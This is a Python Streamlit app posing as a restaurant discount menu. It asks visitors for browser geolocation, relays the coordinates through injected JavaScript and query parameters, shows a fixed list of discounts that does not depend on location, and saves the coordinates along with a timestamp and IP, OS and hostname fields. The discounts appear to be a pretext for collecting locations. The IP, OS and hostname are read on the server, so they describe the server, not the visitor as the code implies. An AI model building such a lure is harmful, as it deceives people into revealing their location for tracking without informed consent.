import streamlit as st
import streamlit.components.v1 as components
import json
import requests
import platform
import socket
from datetime import datetime
from utils import guardar_datos

st.set_page_config(page_title="Carta con Descuentos", layout="centered")

st.title("🍽️ Carta Exclusiva con Descuentos Cercanos")
st.write("Para mostrarte los mejores descuentos cerca de ti, necesitamos acceder a tu ubicación.")

# Botón para iniciar petición de ubicación
if "location_granted" not in st.session_state:
    st.session_state.location_granted = False

if not st.session_state.location_granted:
    if st.button("Permitir acceso a la ubicación"):
        # Inyectar JS para pedir ubicación y setear query params
        components.html(
            """
            <script>
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                const coords = {
                  lat: pos.coords.latitude,
                  lon: pos.coords.longitude
                };
                const coordsStr = JSON.stringify(coords);
                window.parent.postMessage({type: 'geodata', data: coordsStr}, "*");
              },
              (err) => {
                window.parent.postMessage({type: 'geodata', data: JSON.stringify({error: err.message})}, "*");
              }
            );
            </script>
            """,
            height=0,
        )
else:
    st.success("¡Ya tienes acceso a la ubicación!")

# Escuchar mensaje de JS con la ubicación
# Para eso, ponemos un componente HTML que escucha window.postMessage
# y usa window.location.search para enviar datos a Python vía query params

components.html(
    """
    <script>
    window.addEventListener("message", (event) => {
        if(event.data.type === 'geodata'){
            const geodata = event.data.data;
            const url = new URL(window.location);
            url.searchParams.set('geodata', geodata);
            window.history.replaceState(null, null, url);
            // Para forzar refresco y que Python vea el cambio
            window.location.reload();
        }
    });
    </script>
    """,
    height=0,
)

# Leer parámetros de consulta para obtener ubicación
query_params = st.experimental_get_query_params()
lat, lon = None, None
if "geodata" in query_params:
    try:
        geo_data = json.loads(query_params["geodata"][0])
        if "error" in geo_data:
            st.error(f"Error al obtener ubicación: {geo_data['error']}")
        else:
            lat, lon = geo_data.get("lat"), geo_data.get("lon")
            st.session_state.location_granted = True
    except Exception as e:
        st.error(f"Error procesando datos de ubicación: {e}")

if lat is not None and lon is not None:
    st.success(f"¡Gracias! Detectamos tu ubicación: 🌍 ({lat:.4f}, {lon:.4f})")
    st.subheader("Descuentos cercanos para ti:")
    st.markdown("""
    - 🍕 Pizza Margarita -20%
    - 🍣 Sushi Deluxe -15%
    - 🥗 Ensalada Mediterránea -10%
    """)

    # Guardar datos
    user_data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "lat": lat,
        "lon": lon,
        "ip": requests.get("https://api.ipify.org").text,
        "browser": "N/A",  # No se puede obtener directamente en Streamlit sin librerías extras
        "os": platform.system(),
        "hostname": socket.gethostname()
    }
    guardar_datos(user_data)
else:
    if st.session_state.location_granted:
        st.warning("No se pudo obtener tu ubicación. Por favor, permite el acceso en el navegador.")
    else:
        st.info("Por favor, pulsa el botón y acepta la solicitud de ubicación en tu navegador.")
